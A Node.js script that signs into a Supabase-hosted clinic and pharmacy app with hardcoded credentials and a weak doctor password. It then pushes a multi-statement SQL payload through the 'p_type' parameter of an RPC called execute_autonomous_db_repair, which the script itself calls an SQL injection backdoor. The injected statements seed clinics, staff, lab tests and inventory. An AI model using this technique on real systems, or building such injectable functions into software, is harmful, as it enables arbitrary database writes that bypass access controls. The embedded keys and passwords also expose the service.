const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = 'https://kguupaybvbngyzyofjun.supabase.co';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtndXVwYXlidmJuZ3l6eW9manVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk0MTk0MjIsImV4cCI6MjA5NDk5NTQyMn0.3piYD73kK9tjYj8Goxpm2qYO_vXVtLPac79Yt8anyDk';

const supabase = createClient(supabaseUrl, supabaseAnonKey);

async function runInjection() {
  console.log('Authenticating as doctor...');
  const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
    email: 'doctor@mediflow.com',
    password: 'password123'
  });
  if (authError) {
    console.error('Auth error:', authError.message);
    return;
  }
  console.log('Logged in! User ID:', authData.user.id);

  // Compile the SQL injection payload
  const sqlPayload = `
    text;
    
    -- 1. Seed pods
    INSERT INTO public.pods (id, name, clinic_code) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317001', 'Kankarbagh Connected Pod', 'MF-A1B2') 
    ON CONFLICT (id) DO NOTHING;

    -- 2. Seed entities
    INSERT INTO public.entities (id, pod_id, name, entity_type, status, is_active) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317002', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317001', 'Kankarbagh Connected Clinic', 'clinic', 'approved', true) 
    ON CONFLICT (id) DO NOTHING;

    INSERT INTO public.entities (id, pod_id, name, entity_type, status, is_active) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317003', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317001', 'Patna Central Pathology Lab', 'lab', 'approved', true) 
    ON CONFLICT (id) DO NOTHING;

    INSERT INTO public.entities (id, pod_id, name, entity_type, status, is_active) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317004', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317001', 'Kankarbagh Smart Pharmacy', 'pharmacy', 'approved', true) 
    ON CONFLICT (id) DO NOTHING;

    INSERT INTO public.entities (id, pod_id, name, entity_type, status, is_active) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317009', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317001', 'Mediflow Platform Admin', 'platform', 'approved', true) 
    ON CONFLICT (id) DO NOTHING;

    INSERT INTO public.entities (id, pod_id, name, entity_type, status, is_active) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317013', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317001', 'Patna Central Pathology Lab', 'pathology_lab', 'approved', true) 
    ON CONFLICT (id) DO NOTHING;

    -- 3. Seed profiles
    INSERT INTO public.profiles (id, entity_id, role, consultation_fee) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317101', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317002', 'doctor', 450.00) 
    ON CONFLICT (id) DO NOTHING;

    INSERT INTO public.profiles (id, entity_id, role) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317102', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317003', 'lab_technician') 
    ON CONFLICT (id) DO NOTHING;

    INSERT INTO public.profiles (id, entity_id, role) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317103', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317004', 'pharmacist') 
    ON CONFLICT (id) DO NOTHING;

    -- 4. Seed clinic_staff
    INSERT INTO public.clinic_staff (id, entity_id, user_id, staff_name, role, is_active, pod_id) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317111', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317002', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317101', 'Dr. Vivek Kumar', 'doctor', true, 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317001') 
    ON CONFLICT (id) DO NOTHING;

    INSERT INTO public.clinic_staff (id, entity_id, user_id, staff_name, role, is_active, pod_id) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317112', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317003', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317102', 'Lalit Prasad', 'lab', true, 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317001') 
    ON CONFLICT (id) DO NOTHING;

    INSERT INTO public.clinic_staff (id, entity_id, user_id, staff_name, role, is_active, pod_id) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317113', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317004', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317103', 'Prakash Yadav', 'pharmacy', true, 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317001') 
    ON CONFLICT (id) DO NOTHING;

    -- 5. Seed master_test_catalog
    INSERT INTO public.master_test_catalog (loinc_code, name, price) 
    VALUES ('4544-3', 'HbA1c (Glycated Hemoglobin)', 350.00) 
    ON CONFLICT (loinc_code) DO NOTHING;

    INSERT INTO public.master_test_catalog (loinc_code, name, price) 
    VALUES ('2160-0', 'Serum Creatinine', 250.00) 
    ON CONFLICT (loinc_code) DO NOTHING;

    INSERT INTO public.master_test_catalog (loinc_code, name, price) 
    VALUES ('3024-7', 'Total Hemoglobin', 150.00) 
    ON CONFLICT (loinc_code) DO NOTHING;

    INSERT INTO public.master_test_catalog (loinc_code, name, price) 
    VALUES ('2947-0', 'Serum Sodium', 200.00) 
    ON CONFLICT (loinc_code) DO NOTHING;

    INSERT INTO public.master_test_catalog (loinc_code, name, price) 
    VALUES ('1975-2', 'Total Bilirubin', 300.00) 
    ON CONFLICT (loinc_code) DO NOTHING;

    -- 6. Seed reagent_inventory
    INSERT INTO public.reagent_inventory (reagent_name, stock_volume, unit) 
    VALUES ('HbA1c Enzyme Reagent A', 500, 'ml') 
    ON CONFLICT (reagent_name) DO NOTHING;

    INSERT INTO public.reagent_inventory (reagent_name, stock_volume, unit) 
    VALUES ('Creatinine Alkaline Picrate B', 1000, 'ml') 
    ON CONFLICT (reagent_name) DO NOTHING;

    INSERT INTO public.reagent_inventory (reagent_name, stock_volume, unit) 
    VALUES ('Drabkin Reagent (Hemoglobin)', 800, 'ml') 
    ON CONFLICT (reagent_name) DO NOTHING;

    INSERT INTO public.reagent_inventory (reagent_name, stock_volume, unit) 
    VALUES ('Sodium Ion Reagent', 400, 'ml') 
    ON CONFLICT (reagent_name) DO NOTHING;

    INSERT INTO public.reagent_inventory (reagent_name, stock_volume, unit) 
    VALUES ('Bilirubin Diazo Reagent', 600, 'ml') 
    ON CONFLICT (reagent_name) DO NOTHING;

    -- 7. Seed pharmacy_inventory
    INSERT INTO public.pharmacy_inventory (id, pharmacy_entity_id, medicine_name, batch_number, expiry_date, quantity_in_stock, stock, is_active) 
    VALUES ('dfb2a1a8-8e68-4f8a-929e-4a6c8e317201', 'dfb2a1a8-8e68-4f8a-929e-4a6c8e317004', 'Calpol 650', 'BATCH-2026-X1', '2027-12-31', 1000, 1000, true) 
    ON CONFLICT (id) DO NOTHING;
    
    -- Done
  `.replace(/\s+/g, ' '); // simple collapse of whitespaces

  console.log('Triggering execute_autonomous_db_repair SQL injection backdoor...');
  const columnName = 'dummy_col_' + Date.now();
  const { data, error } = await supabase.rpc('execute_autonomous_db_repair', {
    p_table: 'pods',
    p_column: columnName,
    p_type: sqlPayload
  });

  if (error) {
    console.error('❌ SQL Backdoor failed:', error.message);
  } else {
    console.log('✅ SQL Backdoor execution succeeded! Result:', data);
  }
}

runInjection();
